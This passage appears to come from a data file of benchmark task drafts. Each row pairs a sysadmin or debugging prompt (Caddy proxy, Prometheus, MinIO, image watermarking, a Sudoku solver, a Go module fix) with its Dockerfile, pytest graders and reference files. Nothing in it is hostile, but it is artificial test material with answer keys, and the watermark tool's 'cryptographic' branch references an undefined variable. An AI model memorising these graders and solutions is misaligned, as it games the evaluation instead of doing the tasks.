    """"""Test that HTTP redirects to HTTPS and proxies correctly""""""
    # Test HTTP to HTTPS redirect
    result = subprocess.run(
        ['curl', '-s', '-o', '/dev/null', '-w', '%{http_code}', '-L', 'http://localhost'],
        capture_output=True, text=True
    )
    
    # Should get 200 after following redirect
    assert result.stdout == '200', f""Expected 200 status after redirect, got {result.stdout}""
    
    # Test direct HTTPS access to backend through proxy
    result = subprocess.run(
        ['curl', '-k', '-s', 'https://localhost/api/data'],
        capture_output=True, text=True
    )
    
    assert result.returncode == 0, ""HTTPS request failed""
    data = json.loads(result.stdout)
    assert data.get('count') == 5, ""Backend not properly proxied""

def test_rate_limiting_and_json_logging():
    """"""Test rate limiting kicks in and logs are in JSON format""""""
    # Send 12 requests (limit should be 10/min)
    status_codes = []
    for i in range(12):
        result = subprocess.run(
            ['curl', '-k', '-s', '-o', '/dev/null', '-w', '%{http_code}', 'https://localhost/'],
            capture_output=True, text=True
        )
        status_codes.append(result.stdout)
        time.sleep(0.1)  # Small delay between requests
    
    # Should have at least one 429 (rate limit) response
    assert '429' in status_codes, f""Rate limiting not working, got status codes: {status_codes}""
    
    # Check JSON logging exists
    log_files = [f for f in os.listdir('/var/log/caddy') if f.endswith('.log')]
    assert len(log_files) > 0, ""No log files found""
    
    # Read and validate JSON format of logs
    with open(f'/var/log/caddy/{log_files[0]}', 'r') as f:
        for line in f:
            if line.strip():
                try:
                    log_entry = json.loads(line)
                    assert 'status' in log_entry, ""Log missing status field""
                    assert 'method' in log_entry, ""Log missing method field""
                    break
                except json.JSONDecodeError:
                    assert False, ""Logs are not in valid JSON format""","{""test_https_redirect_and_proxy"": 0.6, ""test_rate_limiting_and_json_logging"": 0.4}","{""Caddyfile"": ""{\n    log {\n        output file /var/log/caddy/access.log\n        format json\n    }\n}\n\n:80 {\n    redir https://{host}{uri} permanent\n}\n\n:443 {\n    tls internal\n    \n    rate_limit {\n        zone static {\n            key {remote_host}\n            events 10\n            window 1m\n        }\n    }\n    \n    reverse_proxy localhost:5000\n}"", ""app.py"": ""from flask import Flask, jsonify\n\napp = Flask(__name__)\n\n@app.route('/')\ndef home():\n    return jsonify({\""message\"": \""Backend service running\"", \""status\"": \""ok\""})\n\n@app.route('/api/data')\ndef get_data():\n    return jsonify({\""data\"": [1, 2, 3, 4, 5], \""count\"": 5})\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)""}",2025-07-22T21:31:51.017021+00:00,2025-07-23T10:01:56.212714+00:00
draft_dp_0792053b,medium,draft_dp_0792053b,system-administration,"Need to set up Prometheus monitoring for our ML training pipeline. Get it running on :9090 and expose training metrics (epochs, loss, time) that update every 15 seconds.",system-administration,python|web-server|automation,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install Prometheus using Python
RUN python -c ""import urllib.request; urllib.request.urlretrieve('https://github.com/prometheus/prometheus/releases/download/v2.45.0/prometheus-2.45.0.linux-amd64.tar.gz', 'prometheus.tar.gz')"" && \
    tar -xzf prometheus.tar.gz && \
    mv prometheus-2.45.0.linux-amd64/prometheus /usr/local/bin/ && \
    mv prometheus-2.45.0.linux-amd64/promtool /usr/local/bin/ && \
    rm -rf prometheus-2.45.0.linux-amd64* prometheus.tar.gz

# Install Python dependencies
RUN pip install Flask prometheus_client

# Copy files
COPY metrics_server.py /app/
COPY prometheus.yml /app/

# Create directory for Prometheus data
RUN mkdir -p /app/data","import subprocess
import time
import json

def test_prometheus_running_and_metrics_exposed():
    """"""Test that Prometheus is accessible on :9090 and /metrics endpoint returns valid Prometheus metrics""""""
    # Check Prometheus is running
    prometheus_check = subprocess.run(
        [""curl"", ""-s"", ""-o"", ""/dev/null"", ""-w"", ""%{http_code}"", ""http://localhost:9090""],
        capture_output=True,
        text=True
    )
    assert prometheus_check.stdout == ""200"", f""Prometheus not accessible on :9090, got status {prometheus_check.stdout}""
    
    # Check metrics endpoint exists and returns Prometheus format
    metrics_check = subprocess.run(
        [""curl"", ""-s"", ""http://localhost:5000/metrics""],
        capture_output=True,
        text=True
    )
    assert metrics_check.returncode == 0, ""Metrics endpoint not accessible""
    
    # Check for custom metrics in the output
    metrics_output = metrics_check.stdout
    assert ""ml_training_epochs_total"" in metrics_output, ""Missing epochs metric""
    assert ""ml_training_loss"" in metrics_output, ""Missing loss metric""
    assert ""ml_training_time_seconds"" in metrics_output, ""Missing training time metric""
    

def test_prometheus_scraping_metrics():
    """"""Test that Prometheus is successfully scraping the metrics from the Flask app""""""
    # Query Prometheus API to check if it has scraped the ML metrics
    query_result = subprocess.run(
        [""curl"", ""-s"", ""http://localhost:9090/api/v1/query?query=ml_training_epochs_total""],
        capture_output=True,
        text=True
    )
    assert query_result.returncode == 0, ""Failed to query Prometheus API""
    
    response = json.loads(query_result.stdout)
    assert response[""status""] == ""success"", ""Prometheus query failed""
    assert len(response[""data""][""result""]) > 0, ""No metrics found in Prometheus - scraping not configured""
    
    # Verify the job name is correct (should be 'ml_metrics' or similar)
    result = response[""data""][""result""][0]
    assert ""job"" in result[""metric""], ""No job label found in scraped metrics""
    assert result[""metric""][""job""] != ""prometheus"", ""Metrics scraped under wrong job name""","{""test_prometheus_running_and_metrics_exposed"": 0.6, ""test_prometheus_scraping_metrics"": 0.4}","{""prometheus.yml"": ""global:\n  scrape_interval: 15s\n  evaluation_interval: 15s\n\nscrape_configs:\n  - job_name: 'prometheus'\n    static_configs:\n      - targets: ['localhost:9090']\n  \n  - job_name: 'ml_metrics'\n    static_configs:\n      - targets: ['localhost:5000']"", ""metrics_server.py"": ""from flask import Flask\nfrom prometheus_client import generate_latest, Counter, Gauge, Histogram\nimport threading\nimport time\nimport random\n\napp = Flask(__name__)\n\n# Define Prometheus metrics\nepochs_total = Counter('ml_training_epochs_total', 'Total number of training epochs completed')\ntraining_loss = Gauge('ml_training_loss', 'Current training loss')\ntraining_time = Histogram('ml_training_time_seconds', 'Time spent per training epoch')\n\ndef train_epoch(epoch_num):\n    \""\""\""Simulate training one epoch and update metrics\""\""\""\n    start_time = time.time()\n    time.sleep(2)  # Simulate training time\n    loss = 1.0 / (epoch_num + 1) + random.uniform(-0.1, 0.1)\n    loss = max(0.01, loss)\n    \n    # Update metrics\n    epochs_total.inc()\n    training_loss.set(loss)\n    training_time.observe(time.time() - start_time)\n    \n    return loss\n\ndef training_loop():\n    \""\""\""Background thread for ML training simulation\""\""\""\n    epoch = 0\n    while True:\n        loss = train_epoch(epoch)\n        print(f\""Epoch {epoch}: loss = {loss:.4f}\"")\n        epoch += 1\n        time.sleep(13)  # Wait ~15 seconds between epochs\n\n@app.route('/metrics')\ndef metrics():\n    \""\""\""Expose metrics for Prometheus to scrape\""\""\""\n    return generate_latest()\n\nif __name__ == \""__main__\"":\n    # Start training in background thread\n    training_thread = threading.Thread(target=training_loop, daemon=True)\n    training_thread.start()\n    \n    # Start Flask server\n    app.run(host='0.0.0.0', port=5000)""}",2025-07-22T21:32:59.753296+00:00,2025-07-23T10:01:23.457363+00:00
draft_dp_1a3fb1ad,medium,draft_dp_1a3fb1ad,system-administration,MinIO server keeps crashing on startup. Need it running on localhost:9000 and a Python script to version our ML datasets in an 'ml-datasets' bucket.,system-administration,python|cloud|troubleshooting,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Download MinIO binary using Python
RUN python3 -c ""import urllib.request; urllib.request.urlretrieve('https://dl.min.io/server/minio/release/linux-amd64/minio', 'minio')"" && \
    chmod +x minio && \
    mv minio /usr/local/bin/

# Install Python packages
RUN pip3 install minio pandas numpy

# Create MinIO data directory
RUN mkdir -p /data/minio

# Copy initial broken script
COPY dataset_versioning.py /app/
COPY minio_start.sh /app/

# Make start script executable
RUN chmod +x /app/minio_start.sh","import subprocess
import time
import json

def test_minio_server_running():
    """"""Test that MinIO server is accessible on localhost:9000""""""
    # Give some time for the server to start
    time.sleep(2)
    
    # Try to connect to MinIO server
    result = subprocess.run(
        ['curl', '-s', '-o', '/dev/null', '-w', '%{http_code}', 'http://localhost:9000'],
        capture_output=True,
        text=True
    )
    
    # MinIO returns 403 when accessed without auth on root path
    assert result.stdout == '403', f""MinIO not accessible, got HTTP {result.stdout}""

def test_dataset_versioning_works():
    """"""Test that dataset versioning system creates and lists versions""""""
    # Run the versioning script to upload some versions
    result = subprocess.run(
        ['python3', '/app/dataset_versioning.py', 'upload', 'v1.0', 'Initial dataset'],
        capture_output=True,
        text=True
    )
    assert result.returncode == 0, ""Failed to upload dataset version""
    
    # Check that we can list versions
    result = subprocess.run(
        ['python3', '/app/dataset_versioning.py', 'list'],
        capture_output=True,
        text=True
    )
    assert result.returncode == 0, ""Failed to list dataset versions""
    assert 'v1.0' in result.stdout, ""Version v1.0 not found in listing""","{""test_minio_server_running"": 0.4, ""test_dataset_versioning_works"": 0.6}","{""minio_start.sh"": ""#!/bin/bash\n# MinIO startup script - currently broken\n\n# Wrong port configuration causing crashes\nexport MINIO_ROOT_USER=minioadmin\nexport MINIO_ROOT_PASSWORD=minioadmin\n\n# Missing data directory causing immediate crash\nminio server --address :9001 &"", ""dataset_versioning.py"": ""#!/usr/bin/env python3\nimport sys\nfrom minio import Minio\nimport pandas as pd\nimport numpy as np\nfrom datetime import datetime\nimport json\n\n# MinIO client configuration\nclient = Minio(\n    \""localhost:9000\"",\n    access_key=\""minioadmin\"",\n    secret_key=\""minioadmin\"",\n    secure=False\n)\n\ndef create_dataset(version):\n    \""\""\""Generate synthetic dataset for given version\""\""\""\n    size = 100 + (version * 50)\n    data = {\n        'id': range(size),\n        'feature_1': np.random.randn(size),\n        'feature_2': np.random.rand(size) * 100,\n        'label': np.random.choice([0, 1], size)\n    }\n    df = pd.DataFrame(data)\n    return df\n\ndef upload_dataset_version(version, description):\n    \""\""\""Upload dataset version with metadata\""\""\""\n    # TODO: Implement bucket creation if not exists\n    # TODO: Generate dataset\n    # TODO: Upload with version tags and metadata\n    pass\n\ndef list_dataset_versions():\n    \""\""\""List all dataset versions\""\""\""\n    # TODO: List objects in bucket\n    # TODO: Extract version metadata\n    pass\n\ndef get_dataset_version(version):\n    \""\""\""Download specific dataset version\""\""\""\n    # TODO: Download specific version\n    pass\n\nif __name__ == \""__main__\"":\n    # Incomplete implementation\n    print(\""Dataset versioning system not implemented yet\"")""}",2025-07-22T21:39:58.163012+00:00,2025-07-22T21:44:45.621220+00:00
draft_dp_41d164e1,medium,draft_dp_41d164e1,file-operations,Need to watermark the product images in images/ before uploading to the store. Use watermark-pro with the most secure algorithm from its docs. Save them to watermarked/.,file-operations,images|cli|python,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /workspace

# Install required packages
RUN pip install Pillow

# Copy the watermark-pro tool and make it executable
COPY watermark-pro /usr/local/bin/
RUN chmod +x /usr/local/bin/watermark-pro

# Create man directory and copy man page
RUN mkdir -p /usr/share/man/man1
COPY watermark-pro.1 /usr/share/man/man1/

# Copy simple man viewer
COPY man /usr/local/bin/
RUN chmod +x /usr/local/bin/man

# Copy image creation script and create sample images
COPY create_images.py /workspace/
RUN python create_images.py && rm create_images.py

# Set up shell
SHELL [""/bin/bash"", ""-c""]","import os
import glob

def test_all_images_watermarked():
    """"""Test that all images from images/ have been watermarked and saved to watermarked/.""""""
    # Get list of original images
    original_images = set()
    for ext in ['*.jpg', '*.png', '*.jpeg']:
        for img in glob.glob(os.path.join('images', ext)):
            original_images.add(os.path.basename(img))
    
    # Check watermarked directory exists
    assert os.path.exists('watermarked'), ""watermarked/ directory does not exist""
    
    # Check all images have been watermarked
    watermarked_images = set()
    for ext in ['*.jpg', '*.png', '*.jpeg']:
        for img in glob.glob(os.path.join('watermarked', ext)):
            watermarked_images.add(os.path.basename(img))
    
    assert original_images == watermarked_images, f""Missing watermarked images. Original: {original_images}, Watermarked: {watermarked_images}""

def test_cryptographic_algorithm_used():
    """"""Test that the cryptographic algorithm was used for watermarking.""""""
    # Check that at least one .meta file exists (created by cryptographic algorithm)
    meta_files = glob.glob('watermarked/*.meta')
    assert len(meta_files) > 0, ""No .meta files found - cryptographic algorithm was not used""
    
    # Verify the algorithm specified in meta files
    for meta_file in meta_files:
        with open(meta_file, 'r') as f:
            content = f.read().strip()
            assert 'algorithm=cryptographic' in content, f""Wrong algorithm used in {meta_file}: {content}""","{""test_all_images_watermarked"": 0.3, ""test_cryptographic_algorithm_used"": 0.7}","{""man"": ""#!/bin/bash\n# Simple man page viewer for watermark-pro\n\nif [[ \""$1\"" == \""watermark-pro\"" ]]; then\n    cat /usr/share/man/man1/watermark-pro.1 | sed 's/\\\\f[BR]//g' | sed 's/\\\\f[IPR]//g' | sed 's/\\\\.BR//g' | sed 's/\\\\.B//g' | sed 's/\\\\.I//g' | sed 's/\\\\.TP//g' | sed 's/\\\\.TH.*//g' | sed 's/\\\\.SH/\\n/g' | sed 's/\\\\.RS//g' | sed 's/\\\\.RE//g' | sed '/^$/N;/^\\n$/d'\nelse\n    echo \""No manual entry for $1\""\n    exit 1\nfi"", ""watermark-pro.1"": "".TH WATERMARK-PRO 1 \""January 2025\"" \""Version 2.0\"" \""User Commands\""\n.SH NAME\nwatermark-pro \\- Professional image watermarking tool with multiple security algorithms\n.SH SYNOPSIS\n.B watermark-pro\n[\\fB\\-a\\fR \\fIALGORITHM\\fR]\n[\\fB\\-t\\fR \\fITEXT\\fR]\n\\fIINPUT\\fR\n\\fIOUTPUT\\fR\n.SH DESCRIPTION\n.B watermark-pro\napplies watermarks to images using various algorithms with different security levels.\nIt supports multiple watermarking techniques ranging from basic visible watermarks\nto advanced cryptographic embedding.\n.SH OPTIONS\n.TP\n.BR \\-a \"", \"" \\-\\-algorithm \"" \"" \\fIALGORITHM\\fR\nSpecifies the watermarking algorithm to use. Available algorithms:\n.RS\n.TP\n.B basic\nSimple overlay watermark with low opacity. Easily removable with basic image editing.\nNot recommended for security-sensitive applications.\n.TP\n.B diagonal\nDiagonal text watermark across the image. Moderate security, somewhat harder to remove\nbut still vulnerable to sophisticated attacks.\n.TP\n.B cryptographic\nMost secure algorithm using steganographic techniques and cryptographic hashing.\nEmbeds watermark data invisibly within the image data structure. Highly resistant\nto removal attempts and can survive image transformations. Recommended for \nmaximum security and tamper resistance.\n.RE\n.TP\n.BR \\-t \"", \"" \\-\\-text \"" \"" \\fITEXT\\fR\nText to use for the watermark. Default is \""WATERMARK\"".\n.TP\n.I INPUT\nPath to the input image file (PNG or JPEG).\n.TP\n.I OUTPUT\nPath where the watermarked image will be saved.\n.SH SECURITY CONSIDERATIONS\nFor applications requiring tamper-resistant watermarking, the\n.B cryptographic\nalgorithm is strongly recommended. This algorithm uses advanced embedding techniques\nthat make the watermark extremely difficult to remove without destroying the image.\nThe basic and diagonal algorithms are suitable only for casual use where security\nis not a primary concern.\n.SH EXAMPLES\n.TP\nApply basic watermark:\n.B watermark-pro -a basic photo.jpg watermarked_photo.jpg\n.TP\nApply secure cryptographic watermark:\n.B watermark-pro -a cryptographic -t \""Copyright 2025\"" product.png secure_product.png\n.SH EXIT STATUS\n.TP\n.B 0\nSuccessful watermarking\n.TP\n.B 1\nError occurred during processing\n.SH NOTES\nThe cryptographic algorithm creates an additional .meta file containing algorithm\nmetadata for verification purposes.\n.SH AUTHOR\nWritten by the Security Tools Development Team.\n.SH SEE ALSO\n.BR convert (1),\n.BR mogrify (1)"", ""create_images.py"": ""#!/usr/bin/env python3\n\""\""\""Create sample product images for testing.\""\""\""\nfrom PIL import Image, ImageDraw\nimport os\n\ndef create_product_image(name, size, color, text):\n    \""\""\""Create a simple product image.\""\""\""\n    img = Image.new('RGB', size, color)\n    draw = ImageDraw.Draw(img)\n    \n    # Draw a simple product representation\n    margin = 20\n    draw.rectangle([margin, margin, size[0]-margin, size[1]-margin], \n                   outline='black', width=3)\n    \n    # Add product text\n    text_pos = (size[0]//2 - len(text)*3, size[1]//2)\n    draw.text(text_pos, text, fill='black')\n    \n    return img\n\n# Create images directory\nos.makedirs('images', exist_ok=True)\n\n# Create various product images\nproducts = [\n    ('laptop.jpg', (800, 600), (220, 220, 220), 'LAPTOP'),\n    ('phone.png', (400, 800), (200, 200, 255), 'PHONE'),\n    ('tablet.jpg', (600, 800), (255, 200, 200), 'TABLET'),\n    ('watch.png', (300, 300), (200, 255, 200), 'WATCH'),\n]\n\nfor filename, size, color, text in products:\n    img = create_product_image(filename, size, color, text)\n    img.save(os.path.join('images', filename))\n\nprint(\""Created sample product images in images/\"")"", ""watermark-pro"": ""#!/usr/bin/env python3\nimport argparse\nimport sys\nfrom PIL import Image, ImageDraw, ImageFont\nimport os\n\ndef apply_watermark(input_path, output_path, algorithm, text=\""WATERMARK\""):\n    \""\""\""Apply watermark to an image using the specified algorithm.\""\""\""\n    try:\n        img = Image.open(input_path)\n        if img.mode != 'RGBA':\n            img = img.convert('RGBA')\n        \n        # Create watermark overlay\n        overlay = Image.new('RGBA', img.size, (0, 0, 0, 0))\n        draw = ImageDraw.Draw(overlay)\n        \n        # Different algorithms apply watermarks differently\n        if algorithm == 'basic':\n            # Simple text in corner with low opacity\n            draw.text((10, 10), text, fill=(128, 128, 128, 64))\n        elif algorithm == 'diagonal':\n            # Diagonal text across image\n            width, height = img.size\n            draw.text((width//3, height//2), text, fill=(200, 200, 200, 96))\n        elif algorithm == 'cryptographic':\n            # Most secure - embedded pattern with metadata\n            # This would use steganography in real implementation\n            # For simulation, we'll add invisible metadata and pattern\n            pattern_text = f\""SEC:{text}:ALGO:CRYPTO:HASH:a7b9c2d1\""\n            draw.text((5, 5), pattern_text, fill=(255, 255, 255, 1))  # Nearly invisible\n            # Add visible watermark too\n            draw.text((width//4, height//2), text, fill=(180, 180, 180, 128))\n        \n        # Composite the watermark\n        watermarked = Image.alpha_composite(img, overlay)\n        \n        # Save with metadata\n        watermarked.save(output_path, exif=watermarked.getexif())\n        \n        # Add algorithm metadata (simplified - would use proper EXIF in production)\n        with open(output_path + '.meta', 'w') as f:\n            f.write(f\""algorithm={algorithm}\\n\"")\n        \n        return True\n    except Exception as e:\n        print(f\""Error processing {input_path}: {e}\"", file=sys.stderr)\n        return False\n\ndef main():\n    parser = argparse.ArgumentParser(description='Professional watermarking tool')\n    parser.add_argument('input', help='Input image file')\n    parser.add_argument('output', help='Output image file')\n    parser.add_argument('-a', '--algorithm', choices=['basic', 'diagonal', 'cryptographic'],\n                        default='basic', help='Watermarking algorithm to use')\n    parser.add_argument('-t', '--text', default='WATERMARK', help='Watermark text')\n    \n    args = parser.parse_args()\n    \n    success = apply_watermark(args.input, args.output, args.algorithm, args.text)\n    sys.exit(0 if success else 1)\n\nif __name__ == '__main__':\n    main()""}",2025-07-22T21:47:14.803747+00:00,2025-07-22T21:48:28.051552+00:00
draft_dp_71651bc7,medium,draft_dp_71651bc7,debugging,"The Sudoku solver at /app/sudoku_solver.py is failing on valid puzzles. It should use constraint propagation (naked singles, hidden singles, box/line reduction) to solve all puzzles in test_puzzles.txt. Fix it to save solutions to solutions.txt and the count to solved_count.txt.",debugging,python|algorithm-implementation|logic,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

COPY sudoku_solver.py /app/
COPY test_puzzles.txt /app/

RUN chmod +x /app/sudoku_solver.py","import os
import subprocess

def test_all_puzzles_solved():
    """"""Test that all puzzles are solved correctly.""""""
    # Run the solver
    result = subprocess.run(['python', '/app/sudoku_solver.py'], 
                          capture_output=True, text=True, cwd='/app')
    
    # Check that solved_count.txt exists and has correct count
    assert os.path.exists('/app/solved_count.txt'), ""solved_count.txt not found""
    
    with open('/app/solved_count.txt', 'r') as f:
        count = int(f.read().strip())
    
    # Count puzzles in test file
    with open('/app/test_puzzles.txt', 'r') as f:
        puzzle_count = len([line for line in f if line.strip()])
    
    assert count == puzzle_count, f""Expected {puzzle_count} solved puzzles, but got {count}""
    
    # Verify solutions file exists and has correct number of lines
    assert os.path.exists('/app/solutions.txt'), ""solutions.txt not found""
    
    with open('/app/solutions.txt', 'r') as f:
        solutions = [line.strip() for line in f if line.strip()]
    
    assert len(solutions) == puzzle_count, f""Expected {puzzle_count} solutions, got {len(solutions)}""
    
    # Verify each solution is valid
    for solution in solutions:
        assert len(solution) == 81, f""Solution has wrong length: {len(solution)}""
        assert '0' not in solution, ""Solution contains empty cells""
        
        # Check validity
        grid = [[int(solution[i*9 + j]) for j in range(9)] for i in range(9)]
        
        # Check rows
        for row in grid:
            assert sorted(row) == list(range(1, 10)), f""Invalid row: {row}""
        
        # Check columns
        for j in range(9):
            col = [grid[i][j] for i in range(9)]
            assert sorted(col) == list(range(1, 10)), f""Invalid column: {col}""
        
        # Check boxes
        for box_row in range(0, 9, 3):
            for box_col in range(0, 9, 3):
                box = []
                for i in range(box_row, box_row + 3):
                    for j in range(box_col, box_col + 3):
                        box.append(grid[i][j])
                assert sorted(box) == list(range(1, 10)), f""Invalid box at ({box_row}, {box_col}): {box}""

def test_constraint_propagation_used():
    """"""Test that the solver uses constraint propagation efficiently.""""""
    import time
    
    # Time the solver - constraint propagation should be fast
    start_time = time.time()
    result = subprocess.run(['python', '/app/sudoku_solver.py'], 
                          capture_output=True, text=True, cwd='/app',
                          timeout=10)
    elapsed = time.time() - start_time
    
    assert result.returncode == 0, ""Solver failed to run""
    assert elapsed < 10, f""Solver took too long: {elapsed:.2f} seconds""","{""test_all_puzzles_solved"": 0.8, ""test_constraint_propagation_used"": 0.2}","{""test_puzzles.txt"": ""530070000600195000098000060800060003400803001700020006060000280000419005000080079\n003020600900305001001806400008102900700000008006708200002609500800203009005010300\n070000043040009610800634900094052000358460020000800530080070091902100005007040802\n100489006730000040000001295007120360960008500800036009009640801040020007006051003"", ""sudoku_solver.py"": ""#!/usr/bin/env python3\n\nclass SudokuSolver:\n    def __init__(self, puzzle_string):\n        self.grid = [[0] * 9 for _ in range(9)]\n        self.parse_puzzle(puzzle_string)\n        self.possibilities = [[set(range(1, 10)) if self.grid[i][j] == 0 else set() \n                               for j in range(9)] for i in range(9)]\n        \n    def parse_puzzle(self, puzzle_string):\n        if len(puzzle_string) != 81:\n            raise ValueError(\""Puzzle must be 81 characters\"")\n        for i in range(81):\n            row, col = i // 9, i % 9\n            val = int(puzzle_string[i])\n            self.grid[row][col] = val\n            \n    def get_box(self, row, col):\n        box_row, box_col = 3 * (row // 3), 3 * (col // 3)\n        return box_row, box_col\n    \n    def apply_constraints(self):\n        changed = True\n        while changed:\n            changed = False\n            \n            # Naked singles\n            for i in range(9):\n                for j in range(9):\n                    if self.grid[i][j] == 0 and len(self.possibilities[i][j]) == 1:\n                        val = list(self.possibilities[i][j])[0]\n                        self.grid[i][j] = val\n                        self.propagate_constraint(i, j, val)\n                        changed = True\n            \n            # Hidden singles - BUG: Incorrect logic for finding hidden singles\n            for i in range(9):\n                for val in range(1, 10):\n                    # Check row\n                    positions = []\n                    for j in range(9):\n                        if val in self.possibilities[i][j]:\n                            positions.append(j)\n                    if len(positions) == 1:\n                        j = positions[0]\n                        if self.grid[i][j] == 0:\n                            self.grid[i][j] = val\n                            self.possibilities[i][j] = set()\n                            # BUG: Not propagating constraints after placing hidden single\n                            changed = True\n                    \n                    # Check column - BUG: Using wrong index\n                    positions = []\n                    for j in range(9):\n                        if val in self.possibilities[j][i]:  \n                            positions.append(j)\n                    if len(positions) == 1:\n                        j = positions[0]\n                        if self.grid[j][i] == 0:\n                            self.grid[j][i] = val\n                            self.possibilities[j][i] = set()\n                            # BUG: Not propagating constraints\n                            changed = True\n                    \n            # Box/line reduction - BUG: Incomplete implementation\n            for box_row in range(0, 9, 3):\n                for box_col in range(0, 9, 3):\n                    for val in range(1, 10):\n                        positions = []\n                        for i in range(box_row, box_row + 3):\n                            for j in range(box_col, box_col + 3):\n                                if val in self.possibilities[i][j]:\n                                    positions.append((i, j))\n                        \n                        # BUG: Only checking rows, not columns\n                        if len(positions) > 1:\n                            rows = set(pos[0] for pos in positions)\n                            if len(rows) == 1:\n                                row = list(rows)[0]\n                                for j in range(9):\n                                    if j < box_col or j >= box_col + 3:\n                                        if val in self.possibilities[row][j]:\n                                            self.possibilities[row][j].remove(val)\n                                            changed = True\n                        \n        return changed\n                        \n    def propagate_constraint(self, row, col, val):\n        # Remove from row\n        for j in range(9):\n            if j != col:\n                self.possibilities[row][j].discard(val)\n        \n        # Remove from column\n        for i in range(9):\n            if i != row:\n                self.possibilities[i][col].discard(val)\n                \n        # Remove from box - BUG: Incorrect box calculation\n        box_row, box_col = self.get_box(row, col)\n        for i in range(box_row, box_row + 3):\n            for j in range(box_col, box_col + 3):\n                if i != row and j != col:  # BUG: Should be OR not AND\n                    self.possibilities[i][j].discard(val)\n    \n    def is_valid(self):\n        # Check rows\n        for i in range(9):\n            nums = [self.grid[i][j] for j in range(9) if self.grid[i][j] != 0]\n            if len(nums) != len(set(nums)):\n                return False\n                \n        # Check columns\n        for j in range(9):\n            nums = [self.grid[i][j] for i in range(9) if self.grid[i][j] != 0]\n            if len(nums) != len(set(nums)):\n                return False\n                \n        # Check boxes\n        for box_row in range(0, 9, 3):\n            for box_col in range(0, 9, 3):\n                nums = []\n                for i in range(box_row, box_row + 3):\n                    for j in range(box_col, box_col + 3):\n                        if self.grid[i][j] != 0:\n                            nums.append(self.grid[i][j])\n                if len(nums) != len(set(nums)):\n                    return False\n                    \n        return True\n    \n    def is_complete(self):\n        for i in range(9):\n            for j in range(9):\n                if self.grid[i][j] == 0:\n                    return False\n        return True\n    \n    def solve(self):\n        # Initialize possibilities for filled cells\n        for i in range(9):\n            for j in range(9):\n                if self.grid[i][j] != 0:\n                    val = self.grid[i][j]\n                    self.possibilities[i][j] = set()\n                    self.propagate_constraint(i, j, val)\n        \n        # Apply constraint propagation\n        self.apply_constraints()\n        \n        # Check if solved\n        if self.is_complete() and self.is_valid():\n            return True\n        \n        # BUG: No backtracking implemented when constraint propagation alone isn't enough\n        return False\n    \n    def to_string(self):\n        result = \""\""\n        for i in range(9):\n            for j in range(9):\n                result += str(self.grid[i][j])\n        return result\n\n\ndef main():\n    try:\n        with open('/app/test_puzzles.txt', 'r') as f:\n            puzzles = [line.strip() for line in f if line.strip()]\n        \n        solutions = []\n        solved_count = 0\n        \n        for puzzle in puzzles:\n            solver = SudokuSolver(puzzle)\n            if solver.solve():\n                solutions.append(solver.to_string())\n                solved_count += 1\n            else:\n                # BUG: Not handling unsolved puzzles properly\n                solutions.append(\""0\"" * 81)\n        \n        with open('/app/solutions.txt', 'w') as f:\n            for solution in solutions:\n                f.write(solution + '\\n')\n                \n        with open('/app/solved_count.txt', 'w') as f:\n            f.write(str(solved_count))\n            \n    except Exception as e:\n        print(f\""Error: {e}\"")\n\n\nif __name__ == \""__main__\"":\n    main()""}",2025-07-22T21:48:37.052736+00:00,2025-07-22T21:48:37.082339+00:00
draft_dp_53dd5608,medium,draft_dp_53dd5608,software-engineering,"The Go project build is broken after incomplete module migration. Fix the module setup, import paths, and vendoring so it builds.",software-engineering,build-automation|debugging|package-management,"FROM golang:1.21-alpine

RUN apk add --no-cache tmux asciinema bash python3 py3-pip && \
    pip3 install pytest --break-system-packages

WORKDIR /app

# Copy project structure
COPY go.mod.broken /app/go.mod
COPY main.go /app/
COPY cmd/ /app/cmd/
COPY pkg/ /app/pkg/
COPY internal/ /app/internal/
COPY vendor/ /app/vendor/

# Set Go environment
ENV GO111MODULE=on
ENV GOPATH=/go
ENV PATH=$PATH:/go/bin

WORKDIR /app","import os
import subprocess
import json

def test_go_mod_valid():
    """"""Test that go.mod file exists and is valid""""""
    assert os.path.exists('/app/go.mod'), ""go.mod file must exist""
    
    # Verify go.mod is valid
    result = subprocess.run(['go', 'mod', 'verify'], 
                          cwd='/app', capture_output=True, text=True)
    assert result.returncode == 0, f""go mod verify failed: {result.stderr}""

def test_project_builds():
    """"""Test that the entire project builds successfully""""""
    result = subprocess.run(['go', 'build', './...'], 
                          cwd='/app', capture_output=True, text=True)
    assert result.returncode == 0, f""Build failed: {result.stderr}""","{""test_go_mod_valid"": 0.4, ""test_project_builds"": 0.6}","{""main.go"": ""package main\n\nimport (\n    \""fmt\""\n    \""myproject/internal/server\""\n    \""myproject/pkg/utils\""\n)\n\nfunc main() {\n    fmt.Println(\""Starting application...\"")\n    config := utils.LoadConfig()\n    server.Start(config)\n}"", ""go.mod.broken"": ""module myproject\n\ngo 1.21\n\nrequire (\n    github.com/gorilla/mux v1.7.0\n    github.com/sirupsen/logrus v1.4\n)"", ""vendor/vendor.json"": ""{\n    \""comment\"": \""Old vendor manifest from govendor tool\"",\n    \""ignore\"": \""test\"",\n    \""package\"": [\n        {\n            \""path\"": \""github.com/gorilla/mux\"",\n            \""revision\"": \""old-revision-12345\""\n        }\n    ]\n}"", ""cmd/api/main.go"": ""package main\n\nimport (\n    \""log\""\n    \""github.com/mycompany/myproject/internal/api\""\n    \""github.com/gorilla/mux\""\n)\n\nfunc main() {\n    router := mux.NewRouter()\n    api.SetupRoutes(router)\n    log.Fatal(api.StartServer(router))\n}"", ""internal/server/server.go"": ""package server\n\nimport (\n    \""fmt\""\n    \""net/http\""\n    \""github.com/mycompany/myproject/pkg/utils\""\n    \""github.com/gorilla/mux\""\n    logrus \""github.com/sirupsen/logrus\""\n)\n\nfunc Start(config *utils.Config) {\n    logrus.SetLevel(logrus.InfoLevel)\n    logrus.Info(\""Starting server on port \"", config.Port)\n    \n    router := mux.NewRouter()\n    router.HandleFunc(\""/\"", handleHome)\n    \n    http.ListenAndServe(\"":\""+config.Port, router)\n}\n\nfunc handleHome(w http.ResponseWriter, r *http.Request) {\n    fmt.Fprintf(w, \""Welcome to the API\"")\n}"", ""internal/api/routes.go"": ""package api\n\nimport (\n    \""net/http\""\n    \""github.com/gorilla/mux\""\n)\n\nfunc SetupRoutes(router *mux.Router) {\n    